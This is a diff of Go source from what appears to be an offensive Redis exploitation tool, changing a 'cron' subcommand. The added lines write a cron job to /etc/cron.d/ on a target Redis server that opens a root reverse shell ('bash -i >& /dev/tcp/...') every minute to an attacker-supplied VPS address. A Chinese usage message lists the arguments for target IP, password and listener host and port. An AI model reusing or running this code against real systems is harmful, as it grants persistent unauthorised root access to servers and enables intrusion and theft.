@@ -25,7 +25,7 @@ var rootCmd = &cobra.Command{
 			fmt.Println(err)
 			return
 		}
-		RedisVersion()
+		RedisVersion(true)
 	},
 }
 
@@ -124,9 +124,10 @@ var echoCrontabCmd = &cobra.Command{
 			fmt.Println("参数错误: Redis.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort")
 			return
 		}
-		webshell = fmt.Sprintf("*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
+		webshell = fmt.Sprintf("*/1 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
 		// 在写计划任务的时候可以任意文件名，默认不要写root，这样可能会覆盖原有的计划任务。
-		EchoShell("/var/spool/cron/", "getshell", webshell)
+		// EchoShell("/var/spool/cron/", "root", webshell)
+		EchoShell("/etc/cron.d/", "getshell", webshell)
 	},
 }
 
